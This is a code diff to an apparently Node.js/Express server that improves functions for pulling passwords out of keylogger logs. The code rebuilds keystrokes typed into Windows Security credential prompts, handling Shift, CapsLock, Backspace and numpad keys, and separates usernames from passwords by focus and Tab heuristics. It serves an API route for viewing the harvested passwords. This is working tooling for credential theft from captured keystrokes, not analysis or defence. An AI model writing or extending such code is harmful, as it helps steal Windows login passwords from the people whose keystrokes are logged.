@@ -1615,35 +1615,83 @@ app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
     }
 }));
 
-// 解析包含特殊键的密码字符串
+// 解析包含特殊键的密码字符串// 增强的密码解析函数：模拟真实键盘输入过程
 function parsePassword(raw) {
-    let result = '';
-    let capsLock = false;     // 大小写锁定状态
-    let shiftPressed = false; // Shift 是否被按下（仅对下一个字符有效）
+    let result = [];
+    let capsLock = false;
+    let shiftPressed = false;
 
-    let i = 0;
-    while (i < raw.length) {
-        if (raw[i] === '[') {
-            const end = raw.indexOf(']', i);
-            if (end === -1) {
-                // 未闭合的括号，当作普通字符处理
-                result += raw[i];
-                i++;
+    // 正则匹配 [KEY] 形式的特殊键
+    const specialKeyRegex = /\[([^\]]+)\]/gi;
+
+    // 将原始字符串按普通字符和特殊键标记拆分为 token 序列
+    const tokens = [];
+    let lastIndex = 0;
+    let match;
+    while ((match = specialKeyRegex.exec(raw)) !== null) {
+        // 添加标记之前的普通文本（按字符拆分，保留换行等）
+        const textBefore = raw.slice(lastIndex, match.index);
+        for (const ch of textBefore) {
+            tokens.push({ type: 'char', value: ch });
+        }
+        tokens.push({ type: 'key', value: match[1].toUpperCase() });
+        lastIndex = specialKeyRegex.lastIndex;
+    }
+    // 添加剩余普通文本
+    const textAfter = raw.slice(lastIndex);
+    for (const ch of textAfter) {
+        tokens.push({ type: 'char', value: ch });
+    }
+
+    // Shift 组合符号映射
+    const shiftMap = {
+        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
+        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
+        '`': '~'
+    };
+
+    for (const token of tokens) {
+        if (token.type === 'char') {
+            let ch = token.value;
+
+            // 过滤掉控制字符（除了换行和制表符）
+            if (ch === '\n' || ch === '\r' || ch === '\t') {
+                // 在密码输入中，这些通常不会出现，忽略
                 continue;
             }
 
-            const key = raw.substring(i + 1, end).toUpperCase();
+            // 处理字母大小写
+            if (/[a-zA-Z]/.test(ch)) {
+                const isLetterUpper = (capsLock && !shiftPressed) || (!capsLock && shiftPressed);
+                ch = isLetterUpper ? ch.toUpperCase() : ch.toLowerCase();
+            } else if (shiftPressed && shiftMap[ch]) {
+                // 数字/符号应用 Shift 映射
+                ch = shiftMap[ch];
+            }
+
+            result.push(ch);
+            // Shift 只影响紧接着的一个字符（假设没有显式释放事件）
+            shiftPressed = false;
+        } else { // type === 'key'
+            const key = token.value;
             switch (key) {
                 case 'BACKSPACE':
-                    // 删除前一个字符
-                    result = result.slice(0, -1);
+                    result.pop();
+                    break;
+                case 'DELETE':
+                    // Delete 键在密码框中通常无效果（删除光标后字符），忽略
+                    break;
+                case 'SPACE':
+                    result.push(' ');
                     break;
                 case 'TAB':
-                    result += ' ';  // 将 Tab 转换为空格
+                    result.push('\t');
                     break;
                 case 'ENTER':
                 case 'RETURN':
-                    result += '\n';
+                    result.push('\n');
                     break;
                 case 'CAPSLOCK':
                     capsLock = !capsLock;
@@ -1652,89 +1700,149 @@ function parsePassword(raw) {
                 case 'RSHIFT':
                     shiftPressed = true;
                     break;
-                // 其他特殊键（LCONTROL、LWIN 等）在密码输入中无意义，直接忽略
+                // 忽略修饰键释放
+                case 'LSHIFT_RELEASE':
+                case 'RSHIFT_RELEASE':
+                    shiftPressed = false;
+                    break;
+                case 'LCONTROL':
+                case 'RCONTROL':
+                case 'LALT':
+                case 'RALT':
+                    // 忽略控制键，不产生字符
+                    break;
+                // 小键盘数字
+                case 'NUMPAD0': result.push('0'); break;
+                case 'NUMPAD1': result.push('1'); break;
+                case 'NUMPAD2': result.push('2'); break;
+                case 'NUMPAD3': result.push('3'); break;
+                case 'NUMPAD4': result.push('4'); break;
+                case 'NUMPAD5': result.push('5'); break;
+                case 'NUMPAD6': result.push('6'); break;
+                case 'NUMPAD7': result.push('7'); break;
+                case 'NUMPAD8': result.push('8'); break;
+                case 'NUMPAD9': result.push('9'); break;
+                case 'NUMPADADD': result.push('+'); break;
+                case 'NUMPADSUBTRACT': result.push('-'); break;
+                case 'NUMPADMULTIPLY': result.push('*'); break;
+                case 'NUMPADDIVIDE': result.push('/'); break;
+                case 'NUMPADDECIMAL': result.push('.'); break;
                 default:
+                    // 其他未知键，忽略
                     break;
             }
-            i = end + 1;
-        } else if (raw[i] === '\n') {
-            result += '\n';
-            i++;
-        } else {
-            let ch = raw[i];
-            
-            // 处理字母的大小写（Shift 和 CapsLock 共同作用）
-            if (/[a-zA-Z]/.test(ch)) {
-                // 当 CapsLock 开启时，按 Shift 会临时变为小写；反之亦然
-                const isUpper = (capsLock && !shiftPressed) || (!capsLock && shiftPressed);
-                ch = isUpper ? ch.toUpperCase() : ch.toLowerCase();
-            }
-            
-            // 数字和符号暂不处理 Shift 组合（如 Shift+1 -> !），因为日志中未出现此类情况
-            
-            result += ch;
-            shiftPressed = false; // Shift 只影响紧接着的一个字符，用完后释放
-            i++;
         }
     }
-    return result;
+
+    return result.join('').trim();
 }
 
-// 从日志内容中提取密码
+
+
+// 从日志内容中提取密码。分离用户名与密码
 function extractPasswordsFromLog(content, filename) {
     const passwords = [];
     const lines = content.split('\n');
-    
+    let inPasswordField = false;  // 是否处于密码输入框
+    let rawSequence = [];
+    let timestamp = null;
+
     for (let i = 0; i < lines.length; i++) {
         const line = lines[i].trim();
-        // 查找包含时间戳的行，且窗口标题包含 "Windows 安全" 或 "Windows 安全中心"
-        const lowerLine = line.toLowerCase();
-        if (line.startsWith('[Window:') && (lowerLine.includes('windows 安全') || lowerLine.includes('windows 安全中心'))) {
+        
+        // 窗口切换检测
+        if (line.startsWith('[Window:')) {
+            // 保存上一个窗口的密码（如果有）
+            if (inPasswordField && rawSequence.length > 0) {
+                const rawPassword = rawSequence.join('\n');
+                const parsed = parsePassword(rawPassword);
+                if (parsed && !parsed.includes('404-passwordnotfound') && parsed.length >= 1) {
+                    passwords.push({
+                        file: filename,
+                        timestamp: timestamp || '未知',
+                        password: parsed,
+                        rawPassword: rawPassword
+                    });
+                }
+            }
+            // 重置状态
+            inPasswordField = false;
+            rawSequence = [];
+            timestamp = null;
+            
             // 提取时间戳
-            const timestampMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
-            const timestamp = timestampMatch ? timestampMatch[1] : '未知';
+            const tsMatch = line.match(/at (\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\+\d{4})/);
+            if (tsMatch) timestamp = tsMatch[1];
             
-            // 提取该窗口下的所有密码行，直到遇到下一个窗口或文件结束
-            let j = i + 1;
-            let passwordLines = [];
-            while (j < lines.length) {
-                const currentLine = lines[j].trim();
-                // 如果遇到新的窗口行，停止提取
-                if (currentLine.startsWith('[Window:')) {
-                    break;
-                }
-                // 如果是密码行（非空且长度至少为3），添加到密码行列表
-                if (currentLine && currentLine.length >= 3) {
-                    passwordLines.push(currentLine);
-                }
-                j++;
+            // 检查是否是安全窗口
+            const lowerLine = line.toLowerCase();
+            if (lowerLine.includes('windows 安全') || lowerLine.includes('windows security')) {
+                // 进入安全窗口，准备捕获输入（默认初始不是密码框）
             }
-            
-            // 如果有密码行，将它们合并为一个条目，并解析特殊键
-            if (passwordLines.length > 0) {
-                const rawPassword = passwordLines.join('\n');
-                const parsedPassword = parsePassword(rawPassword);
-                
-                // 过滤不需要的密码
-                const lowerParsedPassword = parsedPassword.toLowerCase();
-                if (lowerParsedPassword.includes('404-passwordnotfound') || lowerParsedPassword.includes('adm1n5')) {
-                    continue;
-                }
-                
-                passwords.push({
-                    file: filename,
-                    timestamp: timestamp,
-                    password: parsedPassword,
-                    rawPassword: rawPassword
-                });
+            continue;
+        }
+
+        // 焦点切换检测（如果日志中有 [Focus: ...] 标记）
+        if (line.startsWith('[Focus:')) {
+            const focusTarget = line.toLowerCase();
+            if (focusTarget.includes('password') || focusTarget.includes('密码')) {
+                inPasswordField = true;
+                rawSequence = []; // 清空之前可能捕获的用户名
+            } else {
+                inPasswordField = false;
             }
+            continue;
+        }
+
+        // 如果没有焦点标记，则采用启发式：遇到 Tab 键后认为进入了密码框
+        // （可根据实际日志格式调整）
+        if (!inPasswordField && line.includes('[TAB]')) {
+            inPasswordField = true;
+            rawSequence = [];
+            continue;
+        }
+
+        // 如果处于密码输入状态，收集按键行
+        if (inPasswordField) {
+            // 如果遇到空行或窗口切换（已处理），则结束当前密码块
+            if (line === '') {
+                if (rawSequence.length > 0) {
+                    const rawPassword = rawSequence.join('\n');
+                    const parsed = parsePassword(rawPassword);
+                    if (parsed && !parsed.includes('404-passwordnotfound') && parsed.length >= 1) {
+                        passwords.push({
+                            file: filename,
+                            timestamp: timestamp || '未知',
+                            password: parsed,
+                            rawPassword: rawPassword
+                        });
+                    }
+                    rawSequence = [];
+                }
+                inPasswordField = false;
+                continue;
+            }
+            // 收集非空行（包括普通字符行和特殊键行）
+            rawSequence.push(line);
         }
     }
-    
+
+    // 处理文件末尾可能残留的密码
+    if (inPasswordField && rawSequence.length > 0) {
+        const rawPassword = rawSequence.join('\n');
+        const parsed = parsePassword(rawPassword);
+        if (parsed && !parsed.includes('404-passwordnotfound') && parsed.length >= 1) {
+            passwords.push({
+                file: filename,
+                timestamp: timestamp || '未知',
+                password: parsed,
+                rawPassword: rawPassword
+            });
+        }
+    }
+
     return passwords;
 }
-
-
 
 // 统一错误处理中间件
 app.use((err, req, res, next) => {
